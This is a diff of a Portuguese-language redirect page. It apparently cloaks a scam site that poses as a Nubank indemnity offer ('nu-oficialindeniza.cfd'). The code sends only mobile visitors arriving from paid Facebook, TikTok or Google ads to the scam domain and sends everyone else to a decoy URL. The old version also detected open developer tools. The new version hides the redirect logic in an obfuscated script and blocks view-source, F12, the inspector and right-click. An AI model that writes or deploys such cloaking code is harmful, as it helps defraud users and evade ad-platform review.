@@ -1,63 +1,57 @@
-
 <!DOCTYPE html>
 <html lang="pt-BR">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Redirecionamento</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Redirecionamento</title>
+  <script>
+  document.addEventListener('keydown', function (e) {
+    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'u') {
+      e.preventDefault();
+      alert('A visualização do código-fonte está desativada.');
+    }
+  });
+</script>
+  <script>
+  // Bloquear Ctrl+U
+  document.addEventListener('keydown', function (e) {
+    if ((e.ctrlKey || e.metaKey) && e.key.toLowerCase() === 'u') {
+      e.preventDefault();
+      alert('A visualização do código-fonte está desativada.');
+    }
+
+    // Bloquear F12
+    if (e.key === 'F12') {
+      e.preventDefault();
+      alert('Inspeção bloqueada.');
+    }
+
+    // Bloquear Ctrl+Shift+I
+    if ((e.ctrlKey || e.metaKey) && e.shiftKey && e.key.toLowerCase() === 'i') {
+      e.preventDefault();
+      alert('Acesso bloqueado.');
+    }
+  });
+
+  // Bloquear botão direito do mouse
+  document.addEventListener('contextmenu', function (e) {
+    e.preventDefault();
+    alert('Clique direito desativado.');
+  });
+</script>
 </head>
 <body>
-    <script>
-        (function () {
-            // Verifica se é dispositivo móvel
-            const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone/i.test(navigator.userAgent);
-            const urlParams = new URLSearchParams(window.location.search);
+  <script>
+function _0x1cc9(){const _0x3536a1=['get','2195wLAoEJ','1445400DSQtnk','9bYagWM','userAgent','cpc','toString','1210500GPBaxi','197363ODMTtI','replace','utm_campaign','paid','google','gclid','143130XBwNGq','442674CyjxdU','8wEBcwD','4252vOcOgs','https://meu-sitevirtual.com/start','1885282cLGvlo','www.nu-oficialindeniza.cfd/','location','test'];_0x1cc9=function(){return _0x3536a1;};return _0x1cc9();}function _0x1974(_0xd01a7d,_0x5f4910){const _0x1cc9f4=_0x1cc9();return _0x1974=function(_0x197450,_0x3dfc90){_0x197450=_0x197450-0x16c;let _0x4b09c7=_0x1cc9f4[_0x197450];return _0x4b09c7;},_0x1974(_0xd01a7d,_0x5f4910);}(function(_0x433dd0,_0x12f468){const _0x124176=_0x1974,_0x49c7fa=_0x433dd0();while(!![]){try{const _0x705ead=parseInt(_0x124176(0x179))/0x1+-parseInt(_0x124176(0x181))/0x2*(parseInt(_0x124176(0x180))/0x3)+parseInt(_0x124176(0x182))/0x4*(parseInt(_0x124176(0x172))/0x5)+-parseInt(_0x124176(0x178))/0x6+parseInt(_0x124176(0x16d))/0x7+parseInt(_0x124176(0x173))/0x8+parseInt(_0x124176(0x174))/0x9*(-parseInt(_0x124176(0x17f))/0xa);if(_0x705ead===_0x12f468)break;else _0x49c7fa['push'](_0x49c7fa['shift']());}catch(_0x3be542){_0x49c7fa['push'](_0x49c7fa['shift']());}}}(_0x1cc9,0x4b20e),(function(){const _0x1c212d=_0x1974,_0x18c7a4=/Android|webOS|iPhone|iPad|iPod|BlackBerry|Windows Phone/i[_0x1c212d(0x170)](navigator[_0x1c212d(0x175)]),_0x5c6a7c=new URLSearchParams(window[_0x1c212d(0x16f)]['search']),_0x5da4a0=_0x5c6a7c[_0x1c212d(0x171)](_0x1c212d(0x17b)),_0x320060=_0x5da4a0&&/CBO|ABO/[_0x1c212d(0x170)](_0x5da4a0),_0xee5857=_0x5c6a7c[_0x1c212d(0x171)]('utm_source'),_0x5ca30b=_0x5c6a7c[_0x1c212d(0x171)]('utm_medium'),_0x50cb86=_0xee5857==='tiktok'&&_0x5ca30b===_0x1c212d(0x17c),_0x5ce8c2=_0x5c6a7c['get'](_0x1c212d(0x17e)),_0x39959c=_0x5ce8c2!==null||_0xee5857===_0x1c212d(0x17d)&&_0x5ca30b===_0x1c212d(0x176),_0x5bee91=_0x320060||_0x50cb86||_0x39959c;if(!_0x18c7a4||!_0x5bee91)window[_0x1c212d(0x16f)][_0x1c212d(0x17a)](_0x1c212d(0x16c));else{const _0x24b4f2=_0x1c212d(0x16e),_0x5788f5=_0x5c6a7c[_0x1c212d(0x177)](),_0x123369=_0x5788f5?_0x24b4f2+'?'+_0x5788f5:_0x24b4f2;window[_0x1c212d(0x16f)]['replace'](_0x123369);}}()));
+  </script>
 
-            // FACEBOOK
-            const utmCampaign = urlParams.get('utm_campaign');
-            const isFacebook = utmCampaign && /CBO|ABO|PEI4/.test(utmCampaign);
-
-            // TIKTOK
-            const utmSource = urlParams.get('utm_source');
-            const utmMedium = urlParams.get('utm_medium');
-            const isTikTok = utmSource === 'tiktok' && utmMedium === 'paid';
-
-            // GOOGLE
-            const gclid = urlParams.get('gclid');
-            const isGoogle = gclid !== null || (utmSource === 'google' && utmMedium === 'cpc');
-
-            // TRAFÉGO VÁLIDO
-            const isValidTraffic = isFacebook || isTikTok || isGoogle;
-
-            // DETECÇÃO DE DEVTOOLS
-            let devtoolsOpen = false;
-            const element = new Image();
-            Object.defineProperty(element, 'id', {
-                get: function () {
-                    devtoolsOpen = true;
-                }
-            });
-            console.log('%c', element);
-
-            // Executa a verificação imediatamente
-            if (devtoolsOpen || !isMobile || !isValidTraffic) {
-                window.location.replace('https://hoje-seu.space/nun/');
-            } else {
-                const baseUrl = "https://www.nu-oficialindeniza.cfd";
-                // Verifica se há parâmetros para evitar adicionar "?" desnecessário
-                const paramsString = urlParams.toString();
-                const redirectUrl = paramsString ? `${baseUrl}?${paramsString}` : baseUrl;
-                window.location.replace(redirectUrl);
-            }
-        })();
-    </script>
-    <script>
-  window.pixelId = "67e382c47c6c993bb57565a3";
-  var a = document.createElement("script");
-  a.setAttribute("async", "");
-  a.setAttribute("defer", "");
-  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
-  document.head.appendChild(a);
-</script>
+  <script>
+    window.pixelId = "67e382c47c6c993bb57565a3";
+    var a = document.createElement("script");
+    a.setAttribute("async", "");
+    a.setAttribute("defer", "");
+    a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+    document.head.appendChild(a);
+  </script>
 </body>
 </html>
